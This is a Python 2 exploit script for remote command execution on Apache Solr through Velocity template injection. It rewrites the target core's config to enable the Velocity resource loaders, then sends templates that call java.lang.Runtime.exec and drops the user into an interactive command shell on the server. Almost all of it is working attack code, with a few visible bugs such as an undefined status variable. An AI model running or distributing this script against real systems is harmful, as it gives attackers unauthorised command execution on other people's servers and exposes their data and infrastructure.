#coding:utf-8
#Author:LSA
#Description:solr rce via Velocity template
#Date:29101031



import requests
import optparse
import sys
import json
import urllib3
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

reload(sys)
sys.setdefaultencoding('utf-8')

def GetPathName(tgtUrl):

    getPathName_url = tgtUrl + "/solr/admin/cores?wt=json"
    getPathName_headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3875.120 Safari/537.36", "Referer": tgtUrl + "/solr/", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    rsp0 = requests.get(getPathName_url, headers=getPathName_headers,verify=False)
    #print getPathName_headers
    pathName = list(json.loads(rsp0.text)['status'])[0]
    print 'Select path name [' + pathName + ']'
    return pathName
    

def ModifyConfig(tgtUrl,pathName):
    
    modifyConfig_url = tgtUrl + "/solr/" +  pathName + "/config"
    modifyConfig_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3875.120 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close", "Content-Type": "application/json"}
    
    rsp1 = requests.get(modifyConfig_url,headers=modifyConfig_headers,verify=False)
    
    solr_resource_loader_enabled = json.loads(rsp1.text)['config']['queryResponseWriter']['velocity']['solr.resource.loader.enabled']
    params_resource_loader_enabled = json.loads(rsp1.text)['config']['queryResponseWriter']['velocity']['params.resource.loader.enabled']
    
    #print solr_resource_loader_enabled
    #print params_resource_loader_enabled
    
    if ((solr_resource_loader_enabled == 'true') and (params_resource_loader_enabled == 'true')):
        print 'config already true,start attack directly!'
        
    
    else:
        print 'Modify config...'
        modifyConfig_json={"update-queryresponsewriter": {"class": "solr.VelocityResponseWriter", "name": "velocity", "params.resource.loader.enabled": "true", "solr.resource.loader.enabled": "true", "startup": "lazy", "template.base.dir": ""}}
        rsp2 = requests.post(modifyConfig_url, headers=modifyConfig_headers, json=modifyConfig_json)
        rsp2status = json.loads(rsp1.text)['status']
        print rsp2status
        if rsp1status == 0:
            print 'Modify config success!'
        else:
	    print 'Modify config failed!'
            sys.exit()
    

def Attack(tgtUrl,pathName):

    print 'Attacking...'
    
    attack_url = tgtUrl + "/solr/"+ pathName +"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27echo%205594bf8e87f93172f046278b005e3082%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
    
    
    attack_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3875.120 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    rsp3 = requests.get(attack_url, headers=attack_headers)
    #print rsp3.text
    if (rsp3.status_code == 200) and ("5594bf8e87f93172f046278b005e3082" in rsp3.text):
        print 'Target is vulnerable!!!Enter cmdshell automatically!Type exit to exit.'
    
    
        while True:
            
          cmd = raw_input("cmd>>> ")
          attack_url = tgtUrl + "/solr/"+ pathName +"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27"+ cmd +"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"

          if cmd == 'exit':
               break
          cmdResult = requests.post(attack_url,headers=attack_headers,verify=False)
          print cmdResult.text.encode('utf-8')
    else:
	print 'Target seem not vulnerable!'
	sys.exit()


if __name__ == '__main__':
    print '''
		****************************************
		*     solr rce via Velocity template   * 
		*              Coded by LSA            * 
		****************************************
		'''

    parser = optparse.OptionParser('python %prog ' + '-h (manual)', version='%prog v1.0')

    parser.add_option('-u', dest='tgtUrl', type='string', help='single url')

    #parser.add_option('-s', dest='timeout', type='int', default=7, help='timeout(seconds)')

    #parser.add_option('-t', dest='threads', type='int', default=5, help='the number of threads')

    (options, args) = parser.parse_args()

    # check = options.check

    tgtUrl = options.tgtUrl
    #timeout = options.timeout
    
    #print tgtUrl
    #print timeout
    
    pathName = GetPathName(tgtUrl)
    ModifyConfig(tgtUrl,pathName)
    Attack(tgtUrl,pathName)
    
    